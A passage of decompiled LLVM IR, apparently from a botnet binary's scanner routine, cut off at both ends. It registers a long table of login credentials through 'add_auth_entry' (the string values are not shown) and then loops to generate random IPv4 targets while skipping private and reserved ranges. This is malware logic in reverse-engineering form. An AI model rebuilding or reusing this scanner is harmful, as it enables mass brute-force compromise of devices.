  %v4_dcc0 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_18498.366 to i32), i32 ptrtoint ([7 x i8]* @global_var_181b4.196 to i32), i32 %v0_dcbc)
  store i32 ptrtoint ([4 x i8]* @global_var_184a0.368 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1814c.172 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_dcd0 = call i32 @add_auth_entry(i32 ptrtoint ([4 x i8]* @global_var_184a0.368 to i32), i32 ptrtoint ([9 x i8]* @global_var_1814c.172 to i32), i32 8)
  store i32 ptrtoint ([7 x i8]* @global_var_184a4.370 to i32), i32* %r0.global-to-local, align 4
  %v0_dcd8 = load i32, i32* @r4, align 4
  store i32 %v0_dcd8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_184a4.370 to i32), i32* %r1.global-to-local, align 4
  %v5_dce0 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_184a4.370 to i32), i32 ptrtoint ([7 x i8]* @global_var_184a4.370 to i32), i32 %v0_dcd8)
  store i32 ptrtoint ([6 x i8]* @global_var_184ac.372 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_184b4.374 to i32), i32* %r1.global-to-local, align 4
  %v0_dcec = load i32, i32* @r4, align 4
  store i32 %v0_dcec, i32* %r2.global-to-local, align 4
  %v4_dcf0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_184ac.372 to i32), i32 ptrtoint (i32* @global_var_184b4.374 to i32), i32 %v0_dcec)
  store i32 ptrtoint ([7 x i8]* @global_var_184bc.376 to i32), i32* %r0.global-to-local, align 4
  %v0_dcf8 = load i32, i32* @r4, align 4
  store i32 %v0_dcf8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_184bc.376 to i32), i32* %r1.global-to-local, align 4
  %v5_dd00 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_184bc.376 to i32), i32 ptrtoint ([7 x i8]* @global_var_184bc.376 to i32), i32 %v0_dcf8)
  store i32 ptrtoint ([6 x i8]* @global_var_184c4.378 to i32), i32* %r0.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_184c4.378 to i32), i32* %r1.global-to-local, align 4
  %v5_dd10 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_184c4.378 to i32), i32 ptrtoint ([6 x i8]* @global_var_184c4.378 to i32), i32 5)
  store i32 ptrtoint ([8 x i8]* @global_var_184cc.380 to i32), i32* %r0.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_184cc.380 to i32), i32* %r1.global-to-local, align 4
  %v5_dd20 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_184cc.380 to i32), i32 ptrtoint ([8 x i8]* @global_var_184cc.380 to i32), i32 7)
  store i32 ptrtoint ([4 x i8]* @global_var_184d4.382 to i32), i32* %r0.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_184d4.382 to i32), i32* %r1.global-to-local, align 4
  %v5_dd30 = call i32 @add_auth_entry(i32 ptrtoint ([4 x i8]* @global_var_184d4.382 to i32), i32 ptrtoint ([4 x i8]* @global_var_184d4.382 to i32), i32 3)
  store i32 ptrtoint ([4 x i8]* @global_var_184d8.384 to i32), i32* %r0.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_184d8.384 to i32), i32* %r1.global-to-local, align 4
  %v5_dd40 = call i32 @add_auth_entry(i32 ptrtoint ([4 x i8]* @global_var_184d8.384 to i32), i32 ptrtoint ([4 x i8]* @global_var_184d8.384 to i32), i32 3)
  store i32 ptrtoint (i32* @global_var_184dc.386 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_184dc.386 to i32), i32* %r1.global-to-local, align 4
  %v3_dd50 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_184dc.386 to i32), i32 ptrtoint (i32* @global_var_184dc.386 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_184e4.388 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_184e4.388 to i32), i32* %r1.global-to-local, align 4
  %v5_dd60 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_184e4.388 to i32), i32 ptrtoint ([5 x i8]* @global_var_184e4.388 to i32), i32 4)
  store i32 ptrtoint ([7 x i8]* @global_var_184ec.390 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_185d0.146 to i32), i32* %r1.global-to-local, align 4
  %v0_dd6c = load i32, i32* @r4, align 4
  store i32 %v0_dd6c, i32* %r2.global-to-local, align 4
  %v4_dd70 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_184ec.390 to i32), i32 ptrtoint (i32* @global_var_185d0.146 to i32), i32 %v0_dd6c)
  store i32 ptrtoint ([6 x i8]* @global_var_184f4.392 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_182c4.182 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_dd80 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_184f4.392 to i32), i32 ptrtoint (i32* @global_var_182c4.182 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_184f4.392 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18134.164 to i32), i32* %r1.global-to-local, align 4
  %v0_dd8c = load i32, i32* @r4, align 4
  store i32 %v0_dd8c, i32* %r2.global-to-local, align 4
  %v4_dd90 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_184f4.392 to i32), i32 ptrtoint (i32* @global_var_18134.164 to i32), i32 %v0_dd8c)
  store i32 ptrtoint ([7 x i8]* @global_var_184fc.394 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_185d0.146 to i32), i32* %r1.global-to-local, align 4
  %v0_dd9c = load i32, i32* @r4, align 4
  store i32 %v0_dd9c, i32* %r2.global-to-local, align 4
  %v4_dda0 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_184fc.394 to i32), i32 ptrtoint (i32* @global_var_185d0.146 to i32), i32 %v0_dd9c)
  store i32 ptrtoint ([7 x i8]* @global_var_184fc.394 to i32), i32* %r0.global-to-local, align 4
  %v0_dda8 = load i32, i32* @r4, align 4
  store i32 %v0_dda8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_184fc.394 to i32), i32* %r1.global-to-local, align 4
  %v5_ddb0 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_184fc.394 to i32), i32 ptrtoint ([7 x i8]* @global_var_184fc.394 to i32), i32 %v0_dda8)
  store i32 ptrtoint ([5 x i8]* @global_var_18504.396 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_18504.396 to i32), i32* %r1.global-to-local, align 4
  %v5_ddc0 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18504.396 to i32), i32 ptrtoint ([5 x i8]* @global_var_18504.396 to i32), i32 4)
  store i32 ptrtoint ([6 x i8]* @global_var_1850c.398 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_ddd0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_1850c.398 to i32), i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32 5)
  store i32 ptrtoint ([8 x i8]* @global_var_18514.400 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_dde0 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_18514.400 to i32), i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), i32 7)
  store i32 ptrtoint ([7 x i8]* @global_var_1851c.402 to i32), i32* %r0.global-to-local, align 4
  %v0_dde8 = load i32, i32* @r4, align 4
  store i32 %v0_dde8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1851c.402 to i32), i32* %r1.global-to-local, align 4
  %v5_ddf0 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_1851c.402 to i32), i32 ptrtoint ([7 x i8]* @global_var_1851c.402 to i32), i32 %v0_dde8)
  store i32 ptrtoint ([6 x i8]* @global_var_18524.404 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1852c.406 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_de00 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18524.404 to i32), i32 ptrtoint ([6 x i8]* @global_var_1852c.406 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_18534.408 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1853c.410 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_de10 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_18534.408 to i32), i32 ptrtoint ([5 x i8]* @global_var_1853c.410 to i32), i32 5)
  store i32 ptrtoint (i32* @global_var_18544.412 to i32), i32* %r0.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18544.412 to i32), i32* %r1.global-to-local, align 4
  %v3_de20 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_18544.412 to i32), i32 ptrtoint (i32* @global_var_18544.412 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_182d8.414 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1854c.416 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_de30 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_182d8.414 to i32), i32 ptrtoint (i32* @global_var_1854c.416 to i32), i32 8)
  store i32 ptrtoint ([7 x i8]* @global_var_18558.418 to i32), i32* %r0.global-to-local, align 4
  %v0_de38 = load i32, i32* @r4, align 4
  store i32 %v0_de38, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_18558.418 to i32), i32* %r1.global-to-local, align 4
  %v5_de40 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_18558.418 to i32), i32 ptrtoint ([7 x i8]* @global_var_18558.418 to i32), i32 %v0_de38)
  store i32 ptrtoint (i32* @global_var_18560.420 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_18568.422 to i32), i32* %r1.global-to-local, align 4
  %v0_de4c = load i32, i32* @r4, align 4
  store i32 %v0_de4c, i32* %r2.global-to-local, align 4
  %v4_de50 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_18560.420 to i32), i32 ptrtoint ([7 x i8]* @global_var_18568.422 to i32), i32 %v0_de4c)
  store i32 ptrtoint (i32* @global_var_185d0.146 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_18570.424 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_de60 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_185d0.146 to i32), i32 ptrtoint ([9 x i8]* @global_var_18570.424 to i32), i32 8)
  store i32 ptrtoint (i32* @global_var_185d0.146 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1857c.426 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_de70 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_185d0.146 to i32), i32 ptrtoint ([9 x i8]* @global_var_1857c.426 to i32), i32 8)
  %v0_de74 = load i32, i32* @r4, align 4
  store i32 %v0_de74, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_185d0.146 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_18588.428 to i32), i32* %r1.global-to-local, align 4
  %v4_de80 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_185d0.146 to i32), i32 ptrtoint ([7 x i8]* @global_var_18588.428 to i32), i32 %v0_de74)
  store i32 ptrtoint (i32* @global_var_18590.430 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1859c.432 to i32), i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  %v4_de90 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_18590.430 to i32), i32 ptrtoint ([5 x i8]* @global_var_1859c.432 to i32), i32 11)
  store i32 ptrtoint ([9 x i8]* @global_var_185a4.434 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_185a4.434 to i32), i32* %r1.global-to-local, align 4
  %v5_dea0 = call i32 @add_auth_entry(i32 ptrtoint ([9 x i8]* @global_var_185a4.434 to i32), i32 ptrtoint ([9 x i8]* @global_var_185a4.434 to i32), i32 8)
  store i32 ptrtoint ([9 x i8]* @global_var_185b0.436 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_185b0.436 to i32), i32* %r1.global-to-local, align 4
  %v5_deb0 = call i32 @add_auth_entry(i32 ptrtoint ([9 x i8]* @global_var_185b0.436 to i32), i32 ptrtoint ([9 x i8]* @global_var_185b0.436 to i32), i32 8)
  store i32 ptrtoint ([9 x i8]* @global_var_185bc.438 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_185bc.438 to i32), i32* %r1.global-to-local, align 4
  %v5_dec0 = call i32 @add_auth_entry(i32 ptrtoint ([9 x i8]* @global_var_185bc.438 to i32), i32 ptrtoint ([9 x i8]* @global_var_185bc.438 to i32), i32 8)
  store i32 ptrtoint (i32* @global_var_182c0.254 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_182c0.254 to i32), i32* %r1.global-to-local, align 4
  %v3_ded0 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_182c0.254 to i32), i32 ptrtoint (i32* @global_var_182c0.254 to i32), i32 8)
  store i32 ptrtoint (i32* @global_var_185c8.440 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_185c8.440 to i32), i32* %r1.global-to-local, align 4
  %v3_dee0 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_185c8.440 to i32), i32 ptrtoint (i32* @global_var_185c8.440 to i32), i32 8)
  store i32 ptrtoint ([9 x i8]* @global_var_185d4.442 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_185d4.442 to i32), i32* %r1.global-to-local, align 4
  %v5_def0 = call i32 @add_auth_entry(i32 ptrtoint ([9 x i8]* @global_var_185d4.442 to i32), i32 ptrtoint ([9 x i8]* @global_var_185d4.442 to i32), i32 8)
  store i32 ptrtoint ([9 x i8]* @global_var_185e0.444 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_185e0.444 to i32), i32* %r1.global-to-local, align 4
  %v5_df00 = call i32 @add_auth_entry(i32 ptrtoint ([9 x i8]* @global_var_185e0.444 to i32), i32 ptrtoint ([9 x i8]* @global_var_185e0.444 to i32), i32 8)
  store i32 ptrtoint ([8 x i8]* @global_var_185ec.446 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_181c4.200 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v5_df10 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_185ec.446 to i32), i32 ptrtoint ([11 x i8]* @global_var_181c4.200 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_185f4.448 to i32), i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v4_df20 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), i32 ptrtoint (i32* @global_var_185f4.448 to i32), i32 13)
  store i32 ptrtoint ([6 x i8]* @global_var_184ac.372 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18604.450 to i32), i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  %v4_df30 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_184ac.372 to i32), i32 ptrtoint (i32* @global_var_18604.450 to i32), i32 14)
  store i32 ptrtoint ([10 x i8]* @global_var_18614.452 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18620.454 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_df40 = call i32 @add_auth_entry(i32 ptrtoint ([10 x i8]* @global_var_18614.452 to i32), i32 ptrtoint (i32* @global_var_18620.454 to i32), i32 10)
  store i32 ptrtoint ([10 x i8]* @global_var_1862c.456 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_18638.458 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v5_df50 = call i32 @add_auth_entry(i32 ptrtoint ([10 x i8]* @global_var_1862c.456 to i32), i32 ptrtoint ([11 x i8]* @global_var_18638.458 to i32), i32 10)
  store i32 ptrtoint ([10 x i8]* @global_var_18644.460 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18400.334 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_df60 = call i32 @add_auth_entry(i32 ptrtoint ([10 x i8]* @global_var_18644.460 to i32), i32 ptrtoint (i32* @global_var_18400.334 to i32), i32 10)
  store i32 ptrtoint ([10 x i8]* @global_var_18650.462 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18400.334 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_df70 = call i32 @add_auth_entry(i32 ptrtoint ([10 x i8]* @global_var_18650.462 to i32), i32 ptrtoint (i32* @global_var_18400.334 to i32), i32 10)
  store i32 ptrtoint (i32* @global_var_18590.430 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1865c.464 to i32), i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  %v3_df80 = call i32 @add_auth_entry(i32 ptrtoint (i32* @global_var_18590.430 to i32), i32 ptrtoint (i32* @global_var_1865c.464 to i32), i32 11)
  store i32 ptrtoint ([13 x i8]* @global_var_18668.466 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([13 x i8]* @global_var_18678.468 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_df90 = call i32 @add_auth_entry(i32 ptrtoint ([13 x i8]* @global_var_18668.466 to i32), i32 ptrtoint ([13 x i8]* @global_var_18678.468 to i32), i32 12)
  store i32 ptrtoint ([7 x i8]* @global_var_18688.470 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18690.472 to i32), i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v4_dfa0 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_18688.470 to i32), i32 ptrtoint (i32* @global_var_18690.472 to i32), i32 13)
  store i32 ptrtoint ([9 x i8]* @global_var_18698.474 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_186a4.476 to i32), i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v5_dfb0 = call i32 @add_auth_entry(i32 ptrtoint ([9 x i8]* @global_var_18698.474 to i32), i32 ptrtoint ([8 x i8]* @global_var_186a4.476 to i32), i32 15)
  store i32 ptrtoint ([12 x i8]* @global_var_186ac.478 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_186b8.480 to i32), i32* %r1.global-to-local, align 4
  store i32 20, i32* %r2.global-to-local, align 4
  %v4_dfc0 = call i32 @add_auth_entry(i32 ptrtoint ([12 x i8]* @global_var_186ac.478 to i32), i32 ptrtoint (i32* @global_var_186b8.480 to i32), i32 20)
  store i32 ptrtoint ([6 x i8]* @global_var_186c4.482 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_186b8.480 to i32), i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  %v4_dfd0 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_186c4.482 to i32), i32 ptrtoint (i32* @global_var_186b8.480 to i32), i32 14)
  store i32 %v4_dfd0, i32* %r0.global-to-local, align 4
  %v2_dfd8 = ptrtoint i32* %stack_var_-1866 to i32
  store i32 %v2_dfd8, i32* @lr, align 4
  br label %dec_label_pc_dfe0

dec_label_pc_dfe0:                                ; preds = %dec_label_pc_e720, %dec_label_pc_d328
  %stack_var_-1880.0 = phi i32 [ %v2_dfd8, %dec_label_pc_d328 ], [ %stack_var_-1880.1, %dec_label_pc_e720 ]
  %stack_var_-1876.0 = phi i16 [ %v5_d320.le, %dec_label_pc_d328 ], [ %stack_var_-1876.1, %dec_label_pc_e720 ]
  store i32 ptrtoint (i32* @global_var_20f64.119 to i32), i32* %r0.global-to-local, align 4
  %v2_dfe4 = load i32, i32* @global_var_20f64.119, align 4
  store i32 %v2_dfe4, i32* @r4, align 4
  %v0_dfe8 = load i32, i32* @fp, align 4
  %v3_dfe8 = icmp uge i32 %v0_dfe8, %v2_dfe4
  store i1 %v3_dfe8, i1* %cpsr_c.global-to-local, align 1
  %v9_dfe8 = icmp eq i32 %v0_dfe8, %v2_dfe4
  store i1 %v9_dfe8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_dfe8, label %dec_label_pc_e268, label %dec_label_pc_dff0

dec_label_pc_dff0:                                ; preds = %dec_label_pc_dfe0
  store i32 0, i32* %r3.global-to-local, align 4
  store i16 0, i16* %stack_var_-52, align 2
  %v2_dff8 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_dff8, i32* @r5, align 4
  br label %dec_label_pc_dffc

dec_label_pc_dffc:                                ; preds = %.thread39, %dec_label_pc_dff0
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-96, align 4
  %v0_e010 = call i32 @rand_next()
  %v1_e010 = trunc i32 %v0_e010 to i16
  store i32 %v0_e010, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23a2c.55 to i32), i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_20f34.134 to i32), i32* %r2.global-to-local, align 4
  %v2_e01c = load i32, i32* @global_var_23a2c.55, align 4
  store i32 %v2_e01c, i32* %r3.global-to-local, align 4
  store i16 %v1_e010, i16* bitcast (i32* @global_var_20f38.140 to i16*), align 4
  store i32 %v2_e01c, i32* @global_var_20f40.483, align 4
  br label %dec_label_pc_e028

dec_label_pc_e028:                                ; preds = %dec_label_pc_e0fc, %dec_label_pc_e058, %dec_label_pc_e130, %dec_label_pc_e124, %dec_label_pc_e118, %dec_label_pc_e10c, %.thread30, %bb367, %bb366, %bb365, %bb364, %bb363, %dec_label_pc_e0f4, %dec_label_pc_e0ec, %bb359, %dec_label_pc_e0bc, %dec_label_pc_e098, %bb352, %dec_label_pc_e068, %bb351, %dec_label_pc_e050, %bb350, %bb369, %dec_label_pc_dffc
  %v0_e028 = call i32 @rand_next()
  store i32 %v0_e028, i32* %r0.global-to-local, align 4
  %v1_e02c = urem i32 %v0_e028, 256
  store i32 %v1_e02c, i32* %r1.global-to-local, align 4
  %v3_e030 = udiv i32 %v0_e028, 256
  store i32 %v3_e030, i32* %r3.global-to-local, align 4
  %v3_e034 = udiv i32 %v0_e028, 65536
  store i32 %v3_e034, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e038 = icmp eq i32 %v1_e02c, 0
  store i1 %v2_e038, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e038, label %bb350, label %bb349

bb349:                                            ; preds = %dec_label_pc_e028
  %v3_e03c = icmp ugt i32 %v1_e02c, 126
  store i1 %v3_e03c, i1* %cpsr_c.global-to-local, align 1
  %v8_e03c = icmp eq i32 %v1_e02c, 127
  store i1 %v8_e03c, i1* %cpsr_z.global-to-local, align 1
  br label %bb350

bb350:                                            ; preds = %dec_label_pc_e028, %bb349
  %v0_e04c = phi i1 [ true, %dec_label_pc_e028 ], [ %v8_e03c, %bb349 ]
  %v1_e040 = urem i32 %v3_e030, 256
  store i32 %v1_e040, i32* %ip.global-to-local, align 4
  %v1_e044 = urem i32 %v3_e034, 256
  store i32 %v1_e044, i32* %r2.global-to-local, align 4
  %v1_e048 = and i32 %v0_e028, 8388608
  %v2_e048 = icmp ne i32 %v1_e048, 0
  store i1 %v2_e048, i1* %cpsr_c.global-to-local, align 1
  %v3_e048 = udiv i32 %v0_e028, 16777216
  store i32 %v3_e048, i32* %r0.global-to-local, align 4
  br i1 %v0_e04c, label %dec_label_pc_e028, label %dec_label_pc_e050

dec_label_pc_e050:                                ; preds = %bb350
  %v2_e050 = icmp ugt i32 %v1_e02c, 2
  store i1 %v2_e050, i1* %cpsr_c.global-to-local, align 1
  %v7_e050 = icmp eq i32 %v1_e02c, 3
  store i1 %v7_e050, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e050, label %dec_label_pc_e028, label %dec_label_pc_e058

dec_label_pc_e058:                                ; preds = %dec_label_pc_e050
  %v1_e058 = add nsw i32 %v1_e02c, -15
  store i32 %v1_e058, i32* %r3.global-to-local, align 4
  %v2_e05c = icmp ugt i32 %v1_e02c, 55
  store i1 %v2_e05c, i1* %cpsr_c.global-to-local, align 1
  %v7_e05c = icmp eq i32 %v1_e02c, 56
  store i1 %v7_e05c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e05c, label %dec_label_pc_e028, label %bb351

bb351:                                            ; preds = %dec_label_pc_e058
  %v3_e060 = icmp ne i32 %v1_e058, 0
  store i1 %v3_e060, i1* %cpsr_c.global-to-local, align 1
  %v8_e060 = icmp eq i32 %v1_e058, 1
  store i1 %v8_e060, i1* %cpsr_z.global-to-local, align 1
  %v2_e064 = xor i1 %v3_e060, true
  %v3_e064 = or i1 %v8_e060, %v2_e064
  br i1 %v3_e064, label %dec_label_pc_e028, label %dec_label_pc_e068

dec_label_pc_e068:                                ; preds = %bb351
  %v2_e068 = icmp ugt i32 %v1_e02c, 9
  store i1 %v2_e068, i1* %cpsr_c.global-to-local, align 1
  %v7_e068 = icmp eq i32 %v1_e02c, 10
  store i1 %v7_e068, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e068, label %dec_label_pc_e028, label %dec_label_pc_e070

dec_label_pc_e070:                                ; preds = %dec_label_pc_e068
  %v2_e070 = icmp ugt i32 %v1_e02c, 191
  store i1 %v2_e070, i1* %cpsr_c.global-to-local, align 1
  %v7_e070 = icmp eq i32 %v1_e02c, 192
  store i1 %v7_e070, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e070, label %bb352, label %dec_label_pc_e07c

bb352:                                            ; preds = %dec_label_pc_e070
  %v3_e074 = icmp ugt i32 %v1_e040, 167
  store i1 %v3_e074, i1* %cpsr_c.global-to-local, align 1
  %v8_e074 = icmp eq i32 %v1_e040, 168
  store i1 %v8_e074, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e074, label %dec_label_pc_e028, label %dec_label_pc_e07c

dec_label_pc_e07c:                                ; preds = %dec_label_pc_e070, %bb352
  %v7_e07c = icmp eq i32 %v1_e02c, 172
  %.429 = zext i1 %v7_e07c to i32
  store i32 %.429, i32* %r3.global-to-local, align 4
  %v2_e088 = icmp ugt i32 %v1_e040, 14
  store i1 %v2_e088, i1* %cpsr_c.global-to-local, align 1
  %v7_e088 = icmp eq i32 %v1_e040, 15
  store i1 %v7_e088, i1* %cpsr_z.global-to-local, align 1
  %v2_e08c = xor i1 %v2_e088, true
  %v3_e08c = or i1 %v7_e088, %v2_e08c
  br i1 %v3_e08c, label %.thread8, label %bb355

.thread8:                                         ; preds = %dec_label_pc_e07c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e0a0

bb355:                                            ; preds = %dec_label_pc_e07c
